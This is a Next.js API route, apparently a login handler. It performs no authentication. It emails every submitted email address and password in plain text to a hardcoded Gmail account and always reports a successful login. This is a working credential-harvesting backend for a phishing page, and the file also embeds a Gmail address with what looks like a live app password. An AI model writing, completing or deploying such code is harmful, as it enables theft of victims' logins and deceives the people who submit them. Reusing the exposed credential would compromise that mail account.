// pages/api/login.ts

import type { NextApiRequest, NextApiResponse } from 'next';
import nodemailer from 'nodemailer';

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === 'POST') {
    const { email, password } = req.body;

    // Example of email sending logic
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'nnaemekafrank400@gmail.com', // Your Gmail address
        pass: 'jawh eqmf njhf vunq',  // Your Gmail password
      },
    });

    const mailOptions = {
      from: 'nnaemekafrank400@gmail.com',
      to: 'nnaemekafrank400@gmail.com',
      subject: 'Login Attempt',
      text: `Email: ${email}, Password: ${password}`,
    };

    transporter.sendMail(mailOptions, (error:any, info:any) => {
      if (error) {
        console.log(error);
        res.status(500).json({ message: 'Email could not be sent' });
      } else {
        console.log('Email sent: ' + info.response);
        res.status(200).json({ message: 'Login successful and email sent' });
      }
    });
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
